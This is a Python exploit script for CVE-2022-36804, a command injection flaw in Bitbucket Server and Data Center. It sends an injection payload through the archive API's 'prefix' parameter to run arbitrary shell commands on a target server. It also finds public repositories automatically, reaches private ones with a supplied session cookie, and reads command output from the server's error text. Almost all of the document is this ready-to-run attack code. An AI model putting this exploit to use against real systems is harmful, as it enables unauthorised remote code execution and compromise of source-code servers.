'''
CVE: 2022-36804
Tested on: Bitbucket Server 7.17.1
Description: This script targets a severe command injection flaw found across several API endpoints of Atlassian's Bitbucket Server and Data Center.
'''

import re
import sys
import requests
import argparse
import urllib.parse

# Define the User-Agent to mimic a standard web browser
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"

# Usage Guidelines for the script
usage = "\n[!] Use cve-2022-36804.py -u domain.com --check\n[!] Or, cve-2022-36804.py -u domain.com -p ProjectKey -r RepoName"
description = "[!] This python script is developed to exploit a Remote Code Execution (RCE) vulnerability in Bitbucket <7.6.17, <7.17.10, <7.21.4, <8.0.3, <8.1.2, <8.2.2, and <8.3.1. This script is tested on version 7.17.1"

# Setting up the command-line argument parser
parser = argparse.ArgumentParser(usage=usage, description=description)
parser.add_argument("-u", dest="url", type=str, required=True, help="Specify a domain/ip to scan for CVE-2022-36804")
parser.add_argument("-p", dest="projkey", type=str, help="Specify a project key")
parser.add_argument("-r", dest="reponame", type=str, help="Specify a repository name")
parser.add_argument("-c", dest="cmd", help="Specify system command like id, whoami, ifconfig, etc.")
parser.add_argument("--session", dest="session", type=str, help="Specify 'BITBUCKETSESSIONID' cookie to access private repository. Here, projkey[-p] and reponame[-r] is must.")
args = parser.parse_args()

# Function to verify the URL provided by the user
def urlCheck(url):
    try:
        try:
            try:
                try:
                    try:
                        requests.head(url, headers={"User-Agent": user_agent})
                    except requests.exceptions.InvalidURL:
                        print ("\n[-] The provided URL is invalid. Please enter a valid URL.\n")
                        sys.exit()
                except requests.exceptions.InvalidSchema:
                    print ("\n[-] Incorrect protocol in the URL "+url+", it must be (http:// or https://)\n")
                    sys.exit()
            except requests.exceptions.MissingSchema:
                print ("\n[-] Please include the protocol (http:// or https://) in "+url+"\n")
                sys.exit()
        except requests.exceptions.ReadTimeout:
            print ("\n[-] Server has not responded within the timeout period for the domain/ip "+url+"\n")
            sys.exit()
    except requests.exceptions.ConnectionError:
        print ("\n[-] Unable to connect to the domain or ip "+url+"\n")
        sys.exit()
        
# Function to attempt the exploitation of the vulnerability
def main_exploit(exploit_url):
    print ("[!] Attempting to send exploit payload...")
    response = requests.get(exploit_url,headers={"User-Agent": user_agent, "Cookie": "BITBUCKETSESSIONID={}".format(args.session)})
    resp_text = response.text
    if "com.atlassian.bitbucket.repository.NoSuchRepositoryException" in resp_text:
        print("[-] Check projkey or reponame again. No private repository found.")
    elif "An error occurred while processing the request" in resp_text:
        print ("[-] Bitbucket server is not vulnerable with CVE-2022-36804.")
    else:
        if "Permission denied" in resp_text:
            string = re.search("'origin/': 1:(.*): Permission denied", resp_text).group(1)
            print ("[+] Bitbucket server is vulnerable with CVE-2022-36804")
            print ("[+] Response: "+string)
        elif "bad line length character" in resp_text:
            print ("[-] Received bad line length character from server. Try different command.")
        elif "'origin/': 1:" and not "Permission denied" in resp_text:
            string = re.search("'origin/': 1:(.*): not found", resp_text).group(1)
            print ("[+] Bitbucket server is vulnerable with CVE-2022-36804")
            print ("[+] Response: "+string)
        else:
            print ("[-] Received an error from server. Command execution failed.")

# Function to coordinate the exploitation process
def exploit(url, cmd, projkey, reponame):
    urlCheck(url)
    if (projkey and reponame) == None:
        public_repo_info  = requests.get(url + "/repos?visibility=public").text
        if "Public Repositories" in public_repo_info:
            repo_details = re.search(url+'/projects/(.*)/repos/(.*)/browse', public_repo_info)
            project_key, repo_name = repo_details.groups()
            print(f"[!] Found Public Project: {project_key}, Repository: {repo_name}")
            exploit_url = url+"/rest/api/latest/projects/"+project_key+"/repos/"+repo_name+"/archive?filename=kiE0h&at=refs%2Fheads%2Fmaster&path=kiE0h&prefix=ax%00--exec=%60"+cmd+"%60%00--remote=origin"
            print ("[!] Command: "+cmd)
            print ("[!] Payload constructed.")
            main_exploit(exploit_url)
        else:
            print ("[-] There are no Public Repository(ies) found.")
    else: #(projkey and reponame) != None:
        try:
            print ("[!] Project Key = "+args.projkey)
            print ("[!] Repository Name = "+args.reponame)
            exploit_url = url+"/rest/api/latest/projects/"+args.projkey+"/repos/"+args.reponame+"/archive?filename=kiE0h&at=refs%2Fheads%2Fmaster&path=kiE0h&prefix=ax%00--exec=%60"+cmd+"%60%00--remote=origin"
            print ("[!] Command: "+cmd)
            print ("[!] Payload constructed")
            main_exploit(exploit_url)
        except AttributeError:
            if args.session:
                print ("[!] Please verify Project Key and Repository Name again.")
            else:
                print ("[!] Please verify Project Key and Repository Name again. If this is a private repository, please use --session to access.")

url = args.url
cmd = urllib.parse.quote(str(args.cmd))
projkey = args.projkey
reponame = args.reponame

if args.url:
    if args.cmd and not args.projkey and not args.reponame:
        exploit (url, cmd, None, None)
    elif args.projkey and args.reponame and not args.cmd:
        exploit (url, "whoami", projkey, reponame)
    elif args.cmd and args.projkey and args.reponame:
        exploit (url, cmd, projkey, reponame)
    elif (args.projkey and not args.reponame) or (args.reponame and not args.projkey):
        print ("[-] Please specify both Project Key and Repository Name.")
    else:
        exploit(url, "whoami", None, None)